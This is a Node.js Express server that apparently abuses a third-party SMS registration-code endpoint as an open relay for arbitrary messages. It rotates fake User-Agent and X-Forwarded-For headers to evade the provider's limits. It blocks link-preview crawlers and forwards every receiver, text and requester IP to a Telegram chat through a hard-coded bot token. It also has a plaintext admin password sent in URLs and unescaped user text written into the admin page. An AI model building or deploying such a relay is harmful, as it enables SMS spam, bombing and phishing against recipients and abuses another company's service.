const express = require('express');
const axios = require('axios');
const fs = require('fs').promises; // Use promises version of fs for async/await
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configuration
let MAX_MESSAGES = 300;
const AUTH_TOKEN = 'YOUR_ACTUAL_AUTH_TOKEN'; // Replace with your real token
const SMS_API_URL = 'http://202.51.182.198:8181/nbp/sms/code';
const TELEGRAM_BOT_TOKEN = '7404527625:AAFEML9zNEOeba3eSnN62x0ESuy2nn1H-4k'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '-1002198268533'; // Replace with your chat ID
const ADMIN_PASSWORD = 'GAJARBOTOL'; // CHANGE THIS!
const MAX_USER_AGENT_MESSAGES = 3; // Max messages from the same user agent with the same text

let messageCount = 0;
const sentMessages = [];

// --- Helper Functions ---
function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function generateRandomIP() {
    const parts = [];
    for (let i = 0; i < 4; i++) {
        parts.push(Math.floor(Math.random() * 255) + 1); // 1-254
    }
    return parts.join('.');
}

function addWatermark(text) {
    return `${text} \ndev: gajarbotolx.t.me`;
}

async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    };

    try {
        await axios.post(url, data);
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// --- Admin Panel Routes ---
app.get('/admin', (req, res) => {
    const password = req.query.password;
    if (password !== ADMIN_PASSWORD) {
        return res.status(401).send('Unauthorized\nDeveloper : gajarbotolx.t.me');
    }

    const messagesHtml = sentMessages.map((msg, i) =>
        `<li>${i + 1}. ${msg.timestamp} - ${msg.receiver}: ${msg.text} - ${msg.userAgent}</li>`
    ).join('');

    res.send(`
        <h1>Admin Panel</h1>
        <form method="post" action="/admin/set-limit">
            <label for="limit">New Message Limit:</label>
            <input type="number" id="limit" name="limit" value="${MAX_MESSAGES}">
            <input type="hidden" name="password" value="${ADMIN_PASSWORD}">
            <button type="submit">Set Limit</button>
        </form>
        <h2>Sent Messages</h2>
        <ul>${messagesHtml}</ul>
        <p>Developer : gajarbotolx.t.me</p>
    `);
});

app.post('/admin/set-limit', (req, res) => {
    const password = req.body.password;
    console.log('Received request to set limit with password:', password);

    if (password !== ADMIN_PASSWORD) {
        console.log('Unauthorized access attempt');
        return res.status(401).json({ error: 'Unauthorized\nDeveloper : gajarbotolx.t.me' });
    }

    try {
        const newLimit = parseInt(req.body.limit);
        console.log('Parsed new limit:', newLimit);

        if (isNaN(newLimit) || newLimit <= 0) {
            console.log('Invalid limit:', newLimit);
            return res.status(400).json({ error: 'Invalid limit\nDeveloper : gajarbotolx.t.me' });
        }

        MAX_MESSAGES = newLimit;
        console.log('Updated MAX_MESSAGES to:', MAX_MESSAGES);
        res.json({ message: `Message limit updated to ${MAX_MESSAGES}\nDeveloper : gajarbotolx.t.me` });
    } catch (error) {
        console.error('Error setting new limit:', error);
        res.status(500).json({ error: 'Internal Server Error\nDeveloper : gajarbotolx.t.me' });
    }
});

// --- SMS Sending Route ---
app.get('/send_sms', async (req, res) => {
    if (messageCount >= MAX_MESSAGES) {
        return res.status(429).json({ error: 'Message limit reached\nDeveloper : gajarbotolx.t.me' });
    }

    const { receiver, text } = req.query;
    if (!receiver || !text) {
        return res.status(400).json({ error: 'Missing receiver or text parameters\nDeveloper : gajarbotolx.t.me' });
    }

    const userAgent = req.headers['user-agent'];
    const forbiddenUserAgents = ["facebookexternalhit/1.1 (http://www.facebook.com/externalhit_uatext.php)","okhttp/3.9.1","facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)","WhatsApp/3.0.0.0 A","Ruby", "python-requests/2.32.3", "TelegramBot (like TwitterBot)","Mozilla/5.0 (Linux; Android 11; vivo 1906; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/12.4.3.0","undefined", undefined];

    if (forbiddenUserAgents.includes(userAgent)) {
        const logMessage = `Forbidden User Agent Detected!\nUser-Agent: ${userAgent}\nReceiver: ${receiver}\nText: ${text}`;
        await sendTelegramMessage(logMessage);
        return res.status(403).json({ error: 'You are Forbidden\nDeveloper : gajarbotolx.t.me' });
    }

    try {
        await fs.access('sms_log.txt'); // Check if file exists
    } catch (err) {
        await fs.writeFile('sms_log.txt', ''); // Create file if it doesn't exist
    }

    const logContents = await fs.readFile('sms_log.txt', 'utf8');
    const logEntries = logContents.split('\n').filter(entry => entry);
    const userAgentOccurrences = logEntries.filter(entry => entry.includes(userAgent) && entry.includes(text)).length;

    if (userAgentOccurrences >= MAX_USER_AGENT_MESSAGES) {
        const logMessage = `Message limit reached for User Agent!\nUser-Agent: ${userAgent}\nReceiver: ${receiver}\nText: ${text}`;
        await sendTelegramMessage(logMessage);
        return res.status(429).json({ error: 'You are Forbidden\nDeveloper : gajarbotolx.t.me' });
    }

    const headers = {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'language': 'en',
        'timeZone': 'Asia/Dhaka',
        'Content-Type': 'application/json',
        'Host': '202.51.182.198:8181',
        'Connection': 'Keep-Alive',
        'User-Agent': getRandomUserAgent(),
        'X-Forwarded-For': generateRandomIP(),
    };

    const data = {
        'receiver': receiver,
        'text': addWatermark(text),
        'title': 'Register Account',
    };

    try {
        const response = await axios.post(SMS_API_URL, data, { headers });
        if (response.data.msg_code === "request.over.max.count") {
            console.log('SMS API responded with over max count:', response.data);
            return res.status(500).json({ error: 'Failed to send SMS: Over max count\nDeveloper : gajarbotolx.t.me' });
        }

        messageCount++;
        const sentMessage = { receiver, text: data.text, timestamp: new Date().toLocaleString(), userAgent };
        sentMessages.push(sentMessage);

        await fs.appendFile('sms_log.txt', `${sentMessage.timestamp}: ${receiver} - ${data.text} - ${userAgent}\n`);

        const realIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const notificationMessage = `SMS sent successfully!\nReceiver: ${receiver}\nText: ${data.text}\nIP: ${realIP}\nUser-Agent: ${userAgent}`;
        await sendTelegramMessage(notificationMessage);

        res.json({ message: 'SMS sent successfully!\nDeveloper : gajarbotolx.t.me' });
    } catch (error) {
        console.error("Error sending SMS:", error.response ? error.response.data : error.message);
        res.status(500).json({ error: 'Failed to send SMS\nDeveloper : gajarbotolx.t.me' });
    }
});

// --- Keep-Alive Route ---
app.get('/keep_alive', (req, res) => {
    res.send('Server is alive\nDeveloper : gajarbotolx.t.me');
});

// --- Server Start ---
const port = 3000;
app.listen(port, () => {
    console.log(`SMS server listening at http://localhost:${port}`);
});

// --- Keep-Alive Ping ---
const keepAlive = async () => {
    try {
        const response = await axios.get(`http://localhost:${port}/keep_alive`);
        console.log('Keep-alive ping successful:', response.status);
    } catch (error) {
        console.error('Error during keep-alive ping:', error.message);
    }
};

// Ping the server every 5 minutes (300,000 milliseconds)
setInterval(keepAlive, 300000);
